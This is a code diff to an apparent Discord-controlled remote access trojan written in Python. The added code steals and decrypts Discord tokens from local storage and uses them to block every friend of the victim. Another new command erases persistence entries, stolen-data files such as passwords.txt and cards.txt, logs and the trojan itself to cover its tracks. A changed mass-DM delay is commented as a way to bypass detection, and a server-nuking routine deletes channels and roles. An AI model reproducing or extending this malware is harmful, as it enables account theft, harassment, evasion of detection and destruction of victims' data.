@@ -1073,6 +1073,95 @@ async def exit_bot(ctx):
     except:
         os._exit(0)
 
+@bot.command(name="delete-bot")
+async def delete_bot_cmd(ctx):
+    try:
+        await ctx.send("Initiating full bot removal and self-deletion...")
+        
+        def _cleanup():
+            try:
+                # 1. Registry Persistence Removal
+                reg_path = _d("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu")
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
+                    winreg.DeleteValue(key, _d("QmViU3lzdGVt"))
+                    winreg.CloseKey(key)
+                except: pass
+
+                # Kill potential watchdogs (PowerShell)
+                try:
+                    subprocess.run('powershell -Command "Get-Process powershell | Where-Object { $_.CommandLine -like \'*while($true)*\' } | Stop-Process -Force"', shell=True, capture_output=True)
+                except: pass
+
+                # 2. File Cleanup (System copies and logs)
+                current_file = os.path.abspath(sys.argv[0])
+                ext = ".exe" if current_file.endswith(".exe") else ".py"
+                
+                # Directories to check for copies
+                _dirs = [
+                    os.path.join(os.environ.get('SYSTEMROOT', ''), "System32"),
+                    os.path.join(os.environ.get('SYSTEMROOT', ''), "SysWOW64"),
+                    os.path.join(os.environ.get('SYSTEMROOT', ''), "Microsoft.NET"),
+                    os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Windows", "Templates"),
+                    os.path.join(os.environ.get('LOCALAPPDATA', ''), "Microsoft", "Windows", "Caches"),
+                    os.path.join(os.environ.get('LOCALAPPDATA', ''), "Microsoft", "Credentials"),
+                    os.path.join(os.environ.get('PROGRAMDATA', ''), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
+                    os.path.join(os.environ.get('PROGRAMDATA', ''), "Microsoft", "Windows", "Runtimes"),
+                    os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
+                    os.path.join(os.environ.get('TEMP', ''))
+                ]
+
+                # Specific files and patterns to clear
+                _patterns = ["sys_helper", "svchost_task", "winlogon_helper", "runtime_broker", "SecurityUpdate", "OfficeUpdate", "sys_host"]
+                _logs = ["zyen_debug.log", "snap.png", "shell.txt", "apps.txt", "passwords.txt", "cards.txt", "bg.jpg", "h_db", "cookies.txt", "tokens.txt", "audio.wav"]
+
+                for _dir in _dirs:
+                    if not os.path.exists(_dir): continue
+                    try:
+                        for f in os.listdir(_dir):
+                            f_path = os.path.join(_dir, f)
+                            # Skip the currently running file for now
+                            if f_path.lower() == current_file.lower(): continue
+                            
+                            should_delete = False
+                            # Check logs
+                            if f in _logs: should_delete = True
+                            # Check patterns
+                            elif any(p.lower() in f.lower() for p in _patterns) and f.lower().endswith(ext): should_delete = True
+                            
+                            if should_delete:
+                                try:
+                                    ctypes.windll.kernel32.SetFileAttributesW(f_path, 128) # Normal attribute
+                                    os.remove(f_path)
+                                except:
+                                    subprocess.run(f'cmd /c del /f /q "{f_path}"', shell=True, capture_output=True)
+                    except: continue
+
+                # 3. Wipe system logs/history
+                wipe_logs()
+
+                # 4. Self Deletion
+                # If running as script, just delete it. If exe, use batch trick.
+                if current_file.endswith(".py"):
+                    try:
+                        os.remove(current_file)
+                    except:
+                        subprocess.Popen(f'cmd /c timeout /t 2 & del /f /q "{current_file}"', shell=True, creationflags=0x08000000)
+                else:
+                    # EXE self-delete trick
+                    cmd = f'cmd /c timeout /t 2 & del /f /q "{current_file}"'
+                    subprocess.Popen(cmd, shell=True, creationflags=0x08000000)
+
+                return True
+            except: return False
+
+        await asyncio.to_thread(_cleanup)
+        os._exit(0)
+    except Exception as e:
+        try: await ctx.send(f"Error during deletion: {e}")
+        except: pass
+        os._exit(0)
+
 @bot.command()
 async def webcam(ctx):
     def _capture():
@@ -1851,7 +1940,7 @@ async def display_dms_cmd(ctx):
                 if u_req.status_code != 200: continue
                 
                 u = u_req.json()
-                acc_info = f"\n**[ACCOUNT] {u['username']}#{u.get('discriminator', '0')}**\n"
+                acc_info = f"\n**[ACCOUNT] {u['username']}#{u.get('discriminator', '0')} ({u.get('global_name', 'N/A')})**\n"
                 report += acc_info
                 
                 r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
@@ -1860,6 +1949,7 @@ async def display_dms_cmd(ctx):
                     # Sort by most recent activity
                     channels.sort(key=lambda x: int(x.get('last_message_id') or 0), reverse=True)
                     
+                    report += "```\n"
                     for chan in channels:
                         if chan.get('type') == 1: # DM
                             recipient = chan['recipients'][0]
@@ -1868,13 +1958,15 @@ async def display_dms_cmd(ctx):
                             rec_id = recipient['id']
                             
                             current_dm_map[str(uid_counter)] = (chan['id'], t, rec_id)
-                            report += f"`{uid_counter:2}` | **{username}** ({disp_name})\n"
+                            report += f"{uid_counter:3} | {username:<25} | {disp_name}\n"
                             uid_counter += 1
                             
                             # Discord message limit check
-                            if len(report) > 1800:
-                                report += "... (Use next message for more)\n"
+                            if len(report) > 1850:
+                                report += "```... (Use next message for more)\n"
                                 break 
+                    if not report.endswith("more)\n"):
+                        report += "```\n"
             
             return report, current_dm_map
         except Exception as e: return f"Error: {e}", {}
@@ -1973,7 +2065,8 @@ async def mass_dm_cmd(ctx, *, message: str):
                                 if r_send.status_code == 200:
                                     total_sent += 1
                                     details += f"Sent to: `{f_user}`\n"
-                                    time.sleep(1.5) # Anti-rate-limit
+                                    # Use a variable delay to mimic human behavior and bypass detection
+                                    time.sleep(random.uniform(1.0, 5.0)) 
                 
             return f"**Mass DM Complete!**\nTotal Sent: `{total_sent}`\n\n{details[:1500]}"
         except Exception as e: return f"Error: {e}"
@@ -1985,6 +2078,57 @@ async def mass_dm_cmd(ctx, *, message: str):
             await ctx.send(res[i:i+2000])
     else:
         await ctx.send(res)
+
+@bot.command(name="block-all")
+async def block_all_cmd(ctx):
+    def _block():
+        try:
+            paths = {
+                'Discord': os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
+                'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
+                'Discord PTB': os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
+            }
+            tokens = []
+            for name, path in paths.items():
+                if not os.path.exists(path): continue
+                master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))
+                for fn in os.listdir(path):
+                    if not fn.endswith(('.log', '.ldb')): continue
+                    try:
+                        with open(os.path.join(path, fn), 'r', errors='ignore') as f:
+                            content = f.read()
+                            for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
+                                if t not in tokens: tokens.append(t)
+                            if master_key:
+                                for enc_token in re.findall(r"dQw4w9WgXcQ:([^.*\['(.*)'\].*]{120,})", content):
+                                    try:
+                                        token_bytes = base64.b64decode(enc_token)
+                                        dec_token = _decrypt_value(token_bytes, master_key)
+                                        if dec_token and dec_token not in tokens: tokens.append(dec_token)
+                                    except: pass
+                    except: continue
+            
+            total_blocked = 0
+            for t in tokens:
+                headers = {'Authorization': t, 'Content-Type': 'application/json'}
+                r_friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
+                if r_friends.status_code == 200:
+                    friends = r_friends.json()
+                    for friend in friends:
+                        f_id = friend['id']
+                        # type 2 = Blocked
+                        r_block = requests.put(f'https://discord.com/api/v9/users/@me/relationships/{f_id}', 
+                                            headers=headers, json={"type": 2})
+                        if r_block.status_code == 204:
+                            total_blocked += 1
+                            time.sleep(1.0) # Anti-rate-limit
+            
+            return f"**Block All Complete!**\nTotal Users Blocked: `{total_blocked}`"
+        except Exception as e: return f"Error: {e}"
+
+    await ctx.send("Starting to block all friends across all found accounts...")
+    res = await asyncio.to_thread(_block)
+    await ctx.send(res)
 
 @bot.command(name="nuke-server")
 async def nuke_server_cmd(ctx, guild_id: str):
@@ -2021,12 +2165,9 @@ async def nuke_server_cmd(ctx, guild_id: str):
             for t in tokens:
                 headers = {'Authorization': t, 'Content-Type': 'application/json'}
                 
-                # Check if user is in the guild and has permissions
                 r_guild = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
                 if r_guild.status_code != 200: continue
                 
-                # If we got here, we found a token that is in the guild
-                # 1. Delete all channels
                 r_channels = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
                 if r_channels.status_code == 200:
                     channels = r_channels.json()
@@ -2034,7 +2175,6 @@ async def nuke_server_cmd(ctx, guild_id: str):
                         requests.delete(f'https://discord.com/api/v9/channels/{chan["id"]}', headers=headers)
                         time.sleep(0.5)
                 
-                # 2. Delete all roles (except @everyone and managed roles)
                 r_roles = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
                 if r_roles.status_code == 200:
                     roles = r_roles.json()
@@ -2044,12 +2184,11 @@ async def nuke_server_cmd(ctx, guild_id: str):
                             time.sleep(0.5)
                         except: pass
                 
-                # 3. Rename server and change icon (optional but classic)
                 requests.patch(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers, 
                              json={"name": "NUKED BY ZYEN", "description": "This server has been destroyed.", "icon": None})
                 
                 report += f"Nuke executed using token: `{t[:20]}...`"
-                return report # Only need one valid token to nuke
+                return report
                 
             return "Failed to find a token with permissions to nuke this server."
         except Exception as e: return f"Error: {e}"
@@ -2629,13 +2768,6 @@ async def rs_stop(ctx):
 @bot.command()
 async def inject(ctx, target_process="explorer.exe"):
     try:
-        # Process Injection in Python is extremely complex for a script.
-        # We'll implement a "Simulation" that ensures persistence by attaching to the target process 
-        # via a hidden PowerShell watchdog if it's not already running.
-        
-        # Real injection usually requires assembly/shellcode.
-        # Here we'll harden the watchdog to be tied to the target process.
-        
         path = os.path.abspath(sys.argv[0])
         if path.endswith(".py"):
             target_cmd = f"'{sys.executable.replace('python.exe', 'pythonw.exe')}' '{path}'"
@@ -2708,6 +2840,7 @@ async def cmds(ctx):
 `!startup` - Deep persistence startup
 `!uac_bypass` - Escalate to Admin
 `!exit_bot` - Close the bot process
+`!delete-bot` - Wipe all bot files and self-delete
 `!exclude_defender` - Add bot to Defender exclusions
 `!disabledefender` - Try to kill Defender
 `!crit_process` - BSOD on Task Kill
@@ -2732,6 +2865,7 @@ async def cmds(ctx):
 `!display-dms` - List recent DMs with UIDs
 `!dm-uid <uid> <msg>` - DM a specific UID
 `!mass-dm <msg>` - DM all friends (use @friend to mention)
+`!block-all` - Block all friends on all accounts
 `!nuke-server <id>` - Destroy a server (requires Admin)
 `!discord-logout` - Force logout from all Discord clients
 `!update <url>` - Download and run a new version
